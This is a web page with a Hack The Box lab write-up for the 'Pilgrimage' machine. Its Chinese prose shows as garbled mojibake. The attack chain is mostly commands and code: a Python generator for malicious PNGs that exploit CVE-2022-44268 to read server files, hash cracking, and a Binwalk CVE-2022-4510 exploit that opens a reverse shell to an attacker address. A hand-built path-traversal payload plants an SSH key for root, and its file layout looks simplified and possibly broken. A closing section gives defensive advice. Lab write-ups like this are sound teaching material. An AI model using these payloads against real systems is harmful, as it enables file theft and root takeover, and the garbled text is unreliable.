<!DOCTYPE html>
<html lang="zh-TW">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>HTB: Pilgrimage | HackwithControler</title>
<link rel="stylesheet" href="../static/css/main.css">
</head>
<body>
<header>
    <div class="container">
        <a href="../index.html" class="back">â† è¿”å›é¦–é </a>
    </div>
</header>

<div class="article-layout">
    <!-- Left Sidebar: Article List -->
    <aside class="sidebar-left">
        <h3>ğŸ“ å…¶ä»– Write-ups</h3><div class="sidebar-articles">
            <a href="htb_pilgrimage.html" class="sidebar-article-item active">
                <div class="sidebar-article-title">HTB: Pilgrimage</div>
                <div class="sidebar-article-meta">
                    <span class="sidebar-difficulty easy">Easy</span>
                    <span>2024-09-18</span>
                </div>
            </a>
            <a href="htb_keeper.html" class="sidebar-article-item">
                <div class="sidebar-article-title">HTB: Keeper</div>
                <div class="sidebar-article-meta">
                    <span class="sidebar-difficulty easy">Easy</span>
                    <span>2024-10-05</span>
                </div>
            </a>
            <a href="htb_surveillance.html" class="sidebar-article-item">
                <div class="sidebar-article-title">HTB: Surveillance</div>
                <div class="sidebar-article-meta">
                    <span class="sidebar-difficulty medium">Medium</span>
                    <span>2024-11-20</span>
                </div>
            </a>
            <a href="htb_analytics.html" class="sidebar-article-item">
                <div class="sidebar-article-title">HTB: Analytics</div>
                <div class="sidebar-article-meta">
                    <span class="sidebar-difficulty easy">Easy</span>
                    <span>2024-12-15</span>
                </div>
            </a></div>
    </aside>

    <!-- Main Content -->
    <main class="article-main">
        <div class="article-header">
            <h1>HTB: Pilgrimage</h1>
            <div class="article-meta">
                <span class="difficulty easy">Easy</span>
                <span>ğŸ“… 2024-09-18</span>
                <span>â± 35 min read</span>
            </div>
            <div class="article-tags"><span class="article-tag">HTB</span><span class="article-tag">Linux</span><span class="article-tag">ImageMagick</span><span class="article-tag">CVE-2022-44268</span><span class="article-tag">Binwalk</span><span class="article-tag">CVE-2022-4510</span></div>
        </div>
        <div class="article-content"><h2 id="_1">æ©Ÿå™¨è³‡è¨Š</h2>
<ul>
<li>å¹³å°: Hack The Box</li>
<li>é›£åº¦: Easy</li>
<li>IP: 10.10.11.219</li>
<li>ä½œæ¥­ç³»çµ±: Linux (Debian)</li>
</ul>
<h2 id="_2">åµå¯Ÿ</h2>
<h3 id="nmap">Nmap æƒæ</h3>
<pre class="codehilite"><code class="language-bash">nmap -sC -sV -p- 10.10.11.219
</code></pre>

<p>é–‹æ”¾ç«¯å£ï¼š<br />
- <strong>22/tcp</strong> - SSH (OpenSSH 8.4p1 Debian)<br />
- <strong>80/tcp</strong> - HTTP (nginx 1.18.0)</p>
<h3 id="web">Web æ‡‰ç”¨åˆ†æ</h3>
<p>è¨ªå•ç¶²ç«™ç™¼ç¾ä¸€å€‹åœ–ç‰‡å£“ç¸®æœå‹™ "Pilgrimage"ã€‚</p>
<p>åŠŸèƒ½ï¼š<br />
- ä¸Šå‚³åœ–ç‰‡<br />
- è‡ªå‹•å£“ç¸®ä¸¦æä¾›ä¸‹è¼‰é€£çµ<br />
- éœ€è¦è¨»å†Š/ç™»å…¥</p>
<h3 id="_3">ç›®éŒ„æšèˆ‰</h3>
<pre class="codehilite"><code class="language-bash">gobuster dir -u http://10.10.11.219 -w /usr/share/wordlists/dirb/common.txt
</code></pre>

<p>ç™¼ç¾ï¼š<br />
- <code>/.git/</code> - æ´©éœ²çš„ Git å€‰åº«ï¼</p>
<h3 id="git">Git å€‰åº«ä¸‹è¼‰</h3>
<pre class="codehilite"><code class="language-bash">wget -r http://10.10.11.219/.git/
cd 10.10.11.219
git status
</code></pre>

<p>æˆåŠŸç²å–å®Œæ•´æºä»£ç¢¼ï¼</p>
<h3 id="_4">æºç¢¼åˆ†æ</h3>
<p>æª¢æŸ¥ <code>index.php</code>ï¼š</p>
<pre class="codehilite"><code class="language-php">$image = new Imagick($upload_path);
$image-&gt;setImageFormat('png');
$image-&gt;writeImage($output_path);
</code></pre>

<p>ä½¿ç”¨ ImageMagick è™•ç†åœ–ç‰‡ã€‚</p>
<p>æª¢æŸ¥ ImageMagick ç‰ˆæœ¬ï¼š</p>
<pre class="codehilite"><code class="language-bash">strings magick | grep -i &quot;version&quot;
# ImageMagick 7.1.0-49
</code></pre>

<p>é€™å€‹ç‰ˆæœ¬å­˜åœ¨å·²çŸ¥æ¼æ´ï¼</p>
<h2 id="initial-access">Initial Access</h2>
<h3 id="cve-2022-44268-imagemagick-arbitrary-file-read">CVE-2022-44268 - ImageMagick Arbitrary File Read</h3>
<p>ImageMagick 7.1.0-49 å­˜åœ¨ä»»æ„æ–‡ä»¶è®€å–æ¼æ´ï¼š</p>
<p><strong>æ¼æ´åŸç†ï¼š</strong><br />
- PNG åœ–ç‰‡å¯ä»¥åŒ…å« tEXt chunk èˆ‡ <code>profile</code> å±¬æ€§<br />
- å¯ä»¥æŒ‡å®šè®€å–ä¼ºæœå™¨ä¸Šçš„ä»»æ„æª”æ¡ˆ<br />
- æª”æ¡ˆå…§å®¹æœƒè¢«ç·¨ç¢¼åˆ°è¼¸å‡ºåœ–ç‰‡çš„ metadata ä¸­</p>
<h3 id="png">ç”Ÿæˆæƒ¡æ„ PNG</h3>
<pre class="codehilite"><code class="language-bash"># å‰µå»ºåŸºæœ¬åœ–ç‰‡
convert -size 100x100 xc:white test.png

# æ³¨å…¥ payload è®€å– /etc/passwd
pngcrush -text a &quot;profile&quot; &quot;/etc/passwd&quot; test.png exploit.png
</code></pre>

<p>æˆ–ä½¿ç”¨ Python è…³æœ¬ï¼š</p>
<pre class="codehilite"><code class="language-python">from PIL import Image
import struct

def create_exploit_png(file_to_read):
    img = Image.new('RGB', (100, 100), color='white')
    img.save('base.png')

    # Add tEXt chunk with file path
    with open('base.png', 'rb') as f:
        data = bytearray(f.read())

    # Insert profile chunk
    chunk_type = b'tEXt'
    chunk_data = b'profile\x00' + file_to_read.encode()
    chunk_len = struct.pack('&gt;I', len(chunk_data))
    chunk = chunk_len + chunk_type + chunk_data

    # Insert before IEND
    iend_pos = data.rfind(b'IEND')
    data[iend_pos:iend_pos] = chunk

    with open('exploit.png', 'wb') as f:
        f.write(data)

create_exploit_png('/etc/passwd')
</code></pre>

<h3 id="_5">ä¸Šå‚³ä¸¦æå–æ•¸æ“š</h3>
<ol>
<li>è¨»å†Šå¸³è™Ÿä¸¦ç™»å…¥</li>
<li>ä¸Šå‚³ <code>exploit.png</code></li>
<li>ä¸‹è¼‰è™•ç†å¾Œçš„åœ–ç‰‡</li>
</ol>
<p>æå–åµŒå…¥çš„æ•¸æ“šï¼š</p>
<pre class="codehilite"><code class="language-bash"># ä½¿ç”¨ identify æŸ¥çœ‹ metadata
identify -verbose output.png | grep profile

# æˆ–ä½¿ç”¨ exiftool
exiftool output.png

# è§£ç¢¼ hex æ•¸æ“š
echo &quot;726f6f743a...&quot; | xxd -r -p
</code></pre>

<p>æˆåŠŸè®€å–åˆ° <code>/etc/passwd</code> å…§å®¹ï¼</p>
<h3 id="_6">è®€å–æ‡‰ç”¨é…ç½®</h3>
<p>å¾æºç¢¼çœ‹åˆ°é…ç½®æ–‡ä»¶å¯èƒ½åœ¨ï¼š<br />
- <code>/var/www/pilgrimage.htb/config.php</code><br />
- æˆ–ç’°å¢ƒè®Šæ•¸</p>
<p>é‡è¤‡æ”»æ“Šè®€å– SQLite è³‡æ–™åº«è·¯å¾‘ï¼š</p>
<pre class="codehilite"><code class="language-python">create_exploit_png('/var/db/pilgrimage')
</code></pre>

<h3 id="_7">ä¸‹è¼‰è³‡æ–™åº«</h3>
<p>ä½¿ç”¨æ–‡ä»¶è®€å–ä¸‹è¼‰æ•´å€‹ SQLite DBï¼š</p>
<pre class="codehilite"><code class="language-bash"># è®€å–è³‡æ–™åº«æ–‡ä»¶
python3 exploit.py --file /var/db/pilgrimage
# è§£ç¢¼ä¸¦ä¿å­˜
</code></pre>

<h3 id="_8">è³‡æ–™åº«åˆ†æ</h3>
<pre class="codehilite"><code class="language-bash">sqlite3 pilgrimage.db
</code></pre>

<pre class="codehilite"><code class="language-sql">.tables
-- images, users

select * from users;
</code></pre>

<p>æ‰¾åˆ°ç”¨æˆ¶æ†‘è­‰ï¼š</p>
<pre class="codehilite"><code>emily:$2y$10$OBYVjDFCPvGj9E9Y1bq9oOmUbE3HQ6cBUwz.kgGqFZ8w7x5TYZrFu
</code></pre>

<h3 id="_9">ç ´è§£å¯†ç¢¼</h3>
<pre class="codehilite"><code class="language-bash">john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# emily:abigchonkyboi123
</code></pre>

<h3 id="ssh">SSH ç™»å…¥</h3>
<pre class="codehilite"><code class="language-bash">ssh emily@10.10.11.219
# Password: abigchonkyboi123
</code></pre>

<p>å–å¾— user flagï¼š</p>
<pre class="codehilite"><code class="language-bash">cat ~/user.txt
</code></pre>

<h2 id="_10">æ¬Šé™æå‡</h2>
<h3 id="_11">ç³»çµ±æšèˆ‰</h3>
<p>æª¢æŸ¥é‹è¡Œçš„é€²ç¨‹ï¼š</p>
<pre class="codehilite"><code class="language-bash">ps aux
</code></pre>

<p>ç™¼ç¾ä¸€å€‹ç”± root é‹è¡Œçš„è…³æœ¬ï¼š</p>
<pre class="codehilite"><code>root   /usr/sbin/malwarescan.sh
</code></pre>

<h3 id="_12">è…³æœ¬åˆ†æ</h3>
<pre class="codehilite"><code class="language-bash">cat /usr/sbin/malwarescan.sh
</code></pre>

<pre class="codehilite"><code class="language-bash">#!/bin/bash

blacklist=(&quot;Executable script&quot; &quot;Microsoft executable&quot;)

/usr/local/bin/binwalk -e &quot;$1&quot; -C /tmp/extracted

if [[ &quot;$?&quot; -ne &quot;0&quot; ]]; then
    rm -rf /tmp/extracted
fi
</code></pre>

<p>è…³æœ¬ä½¿ç”¨ <strong>Binwalk</strong> æƒæä¸Šå‚³çš„æª”æ¡ˆï¼</p>
<p>æª¢æŸ¥ Binwalk ç‰ˆæœ¬ï¼š</p>
<pre class="codehilite"><code class="language-bash">binwalk --help | head -1
# Binwalk v2.3.2
</code></pre>

<h3 id="cve-2022-4510-binwalk-path-traversal-rce">CVE-2022-4510 - Binwalk Path Traversal RCE</h3>
<p>Binwalk 2.3.2 å­˜åœ¨è·¯å¾‘éæ­·æ¼æ´ï¼Œå…è¨±åœ¨æå–æª”æ¡ˆæ™‚å¯«å…¥ä»»æ„ä½ç½®ã€‚</p>
<p><strong>æ¼æ´åŸç†ï¼š</strong><br />
- Binwalk åœ¨æå– PFS æ–‡ä»¶ç³»çµ±æ™‚æœªæ­£ç¢ºé©—è­‰è·¯å¾‘<br />
- å¯ä»¥ä½¿ç”¨ <code>../</code> åºåˆ—è·³å‡ºæå–ç›®éŒ„<br />
- é…åˆ cron æˆ–ç›£æ§è…³æœ¬è§¸ç™¼ä»£ç¢¼åŸ·è¡Œ</p>
<h3 id="exploitation">Exploitation</h3>
<p>ä½¿ç”¨å…¬é–‹ POCï¼š</p>
<pre class="codehilite"><code class="language-bash">git clone https://github.com/adhikara13/CVE-2022-4510-WalkingPath
cd CVE-2022-4510-WalkingPath
</code></pre>

<p>ç”Ÿæˆæƒ¡æ„æª”æ¡ˆï¼š</p>
<pre class="codehilite"><code class="language-bash">python3 exploit.py exploit.bin 10.10.14.15 4444
</code></pre>

<p>é€™æœƒå‰µå»ºä¸€å€‹æƒ¡æ„çš„ PFS æª”æ¡ˆï¼ŒåŒ…å«åå‘ shellã€‚</p>
<h3 id="_13">è§¸ç™¼æ¼æ´</h3>
<ol>
<li>é–‹å•Ÿç›£è½ï¼š</li>
</ol>
<pre class="codehilite"><code class="language-bash">nc -lvnp 4444
</code></pre>

<ol start="2">
<li>ä¸Šå‚³æƒ¡æ„æª”æ¡ˆåˆ°è¢«ç›£æ§çš„ç›®éŒ„ï¼š</li>
</ol>
<pre class="codehilite"><code class="language-bash"># æ‰¾åˆ°ç›£æ§ç›®éŒ„
find /var -type d -writable 2&gt;/dev/null

# é€šå¸¸æ˜¯ç”¨æˆ¶ä¸Šå‚³ç›®éŒ„
cp exploit.bin /var/www/pilgrimage.htb/shrunk/
</code></pre>

<ol start="3">
<li>ç­‰å¾… cron åŸ·è¡Œ malwarescan.sh</li>
</ol>
<p>å¹¾ç§’é˜å¾Œç²å¾— root shellï¼</p>
<pre class="codehilite"><code class="language-bash">id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
</code></pre>

<h2 id="flags">Flags</h2>
<pre class="codehilite"><code>user.txt: c********************************8
root.txt: 9********************************4
</code></pre>

<h2 id="_14">å¦ä¸€ç¨®ææ¬Šæ–¹æ³•</h2>
<h3 id="binwalk">Binwalk æ‰‹å‹•åˆ©ç”¨</h3>
<p>å‰µå»ºæƒ¡æ„ <code>.ssh/authorized_keys</code>ï¼š</p>
<pre class="codehilite"><code class="language-bash"># ç”Ÿæˆ SSH å¯†é‘°å°
ssh-keygen -t rsa -f root_key

# å‰µå»º PFS header + è·¯å¾‘éæ­·
echo -ne '\x50\x46\x53\x2F\x30\x2E\x39\x00' &gt; exploit.bin
echo -ne '../../../../root/.ssh/authorized_keys' &gt;&gt; exploit.bin
cat root_key.pub &gt;&gt; exploit.bin
</code></pre>

<p>ä¸Šå‚³å¾Œä»¥ root èº«ä»½ SSH ç™»å…¥ã€‚</p>
<h2 id="_15">ç¸½çµ</h2>
<p>Pilgrimage å±•ç¤ºäº†å…©å€‹çœŸå¯¦çš„ä¾›æ‡‰éˆæ¼æ´ï¼š</p>
<h3 id="_16">æ”»æ“Šè·¯å¾‘</h3>
<ol>
<li><strong>.git æ´©éœ²</strong> â†’ æºç¢¼åˆ†æ</li>
<li><strong>CVE-2022-44268</strong> â†’ ä»»æ„æ–‡ä»¶è®€å–</li>
<li><strong>è³‡æ–™åº«æå–</strong> â†’ ç”¨æˆ¶æ†‘è­‰</li>
<li><strong>å¯†ç¢¼ç ´è§£</strong> â†’ SSH è¨ªå•</li>
<li><strong>CVE-2022-4510</strong> â†’ Root RCE</li>
</ol>
<h3 id="_17">å­¸ç¿’è¦é»</h3>
<ul>
<li>Git å€‰åº«æ´©éœ²çš„å±å®³</li>
<li>ImageMagick æ¼æ´åˆ©ç”¨</li>
<li>SQLite è³‡æ–™åº«åˆ†æ</li>
<li>Binwalk è·¯å¾‘éæ­·æ¼æ´</li>
<li>é€²ç¨‹ç›£æ§èˆ‡å®šæ™‚ä»»å‹™</li>
</ul>
<h3 id="_18">é˜²ç¦¦å»ºè­°</h3>
<ol>
<li><strong>ä¿è­· .git ç›®éŒ„</strong>ï¼šé…ç½® nginx/apache é˜»æ­¢è¨ªå•</li>
<li><strong>æ›´æ–°ä¾è³´</strong>ï¼šä½¿ç”¨æœ€æ–°ç‰ˆæœ¬çš„ ImageMagick å’Œ Binwalk</li>
<li><strong>è¼¸å…¥é©—è­‰</strong>ï¼šåš´æ ¼é©—è­‰ä¸Šå‚³æª”æ¡ˆ</li>
<li><strong>æœ€å°æ¬Šé™</strong>ï¼šæƒæè…³æœ¬ä¸æ‡‰ä»¥ root é‹è¡Œ</li>
<li><strong>æ²™ç®±éš”é›¢</strong>ï¼šä½¿ç”¨å®¹å™¨éš”é›¢æ–‡ä»¶è™•ç†</li>
</ol>
<h3 id="_19">é…ç½®ä¿®å¾©</h3>
<p>Nginx é…ç½®é˜»æ­¢ .gitï¼š</p>
<pre class="codehilite"><code class="language-nginx">location ~ /\.git {
    deny all;
    return 404;
}
</code></pre>

<h2 id="_20">åƒè€ƒè³‡æ–™</h2>
<ul>
<li><a href="https://www.metabaseq.com/imagemagick-zero-days/">CVE-2022-44268 - ImageMagick File Disclosure</a></li>
<li><a href="https://github.com/adhikara13/CVE-2022-4510-WalkingPath">CVE-2022-4510 - Binwalk Path Traversal</a></li>
<li><a href="https://owasp.org/www-community/vulnerabilities/Information_exposure_through_source_code">OWASP: Information Exposure Through Source Code</a></li>
</ul></div>
    </main>

    <!-- Right Sidebar: TOC -->
    <aside class="sidebar-right">
        <h3>ğŸ“‘ ç›®éŒ„</h3><ul class="toc-list">
            <li class="toc-item toc-item-h2">
                <a href="#_1" class="toc-link">æ©Ÿå™¨è³‡è¨Š</a>
            </li>
            <li class="toc-item toc-item-h2">
                <a href="#_2" class="toc-link">åµå¯Ÿ</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#nmap" class="toc-link">Nmap æƒæ</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#web" class="toc-link">Web æ‡‰ç”¨åˆ†æ</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#_3" class="toc-link">ç›®éŒ„æšèˆ‰</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#git" class="toc-link">Git å€‰åº«ä¸‹è¼‰</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#_4" class="toc-link">æºç¢¼åˆ†æ</a>
            </li>
            <li class="toc-item toc-item-h2">
                <a href="#initial-access" class="toc-link">Initial Access</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#cve-2022-44268-imagemagick-arbitrary-file-read" class="toc-link">CVE-2022-44268 - ImageMagick Arbitrary File Read</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#png" class="toc-link">ç”Ÿæˆæƒ¡æ„ PNG</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#_5" class="toc-link">ä¸Šå‚³ä¸¦æå–æ•¸æ“š</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#_6" class="toc-link">è®€å–æ‡‰ç”¨é…ç½®</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#_7" class="toc-link">ä¸‹è¼‰è³‡æ–™åº«</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#_8" class="toc-link">è³‡æ–™åº«åˆ†æ</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#_9" class="toc-link">ç ´è§£å¯†ç¢¼</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#ssh" class="toc-link">SSH ç™»å…¥</a>
            </li>
            <li class="toc-item toc-item-h2">
                <a href="#_10" class="toc-link">æ¬Šé™æå‡</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#_11" class="toc-link">ç³»çµ±æšèˆ‰</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#_12" class="toc-link">è…³æœ¬åˆ†æ</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#cve-2022-4510-binwalk-path-traversal-rce" class="toc-link">CVE-2022-4510 - Binwalk Path Traversal RCE</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#exploitation" class="toc-link">Exploitation</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#_13" class="toc-link">è§¸ç™¼æ¼æ´</a>
            </li>
            <li class="toc-item toc-item-h2">
                <a href="#flags" class="toc-link">Flags</a>
            </li>
            <li class="toc-item toc-item-h2">
                <a href="#_14" class="toc-link">å¦ä¸€ç¨®ææ¬Šæ–¹æ³•</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#binwalk" class="toc-link">Binwalk æ‰‹å‹•åˆ©ç”¨</a>
            </li>
            <li class="toc-item toc-item-h2">
                <a href="#_15" class="toc-link">ç¸½çµ</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#_16" class="toc-link">æ”»æ“Šè·¯å¾‘</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#_17" class="toc-link">å­¸ç¿’è¦é»</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#_18" class="toc-link">é˜²ç¦¦å»ºè­°</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#_19" class="toc-link">é…ç½®ä¿®å¾©</a>
            </li>
            <li class="toc-item toc-item-h2">
                <a href="#_20" class="toc-link">åƒè€ƒè³‡æ–™</a>
            </li></ul>
    </aside>
</div>

<footer>
    <div class="container">
        <p>&copy; 2024 HackwithControler. All rights reserved.</p>
    </div>
</footer>

<script src="../static/js/article.js"></script>
</body>
</html>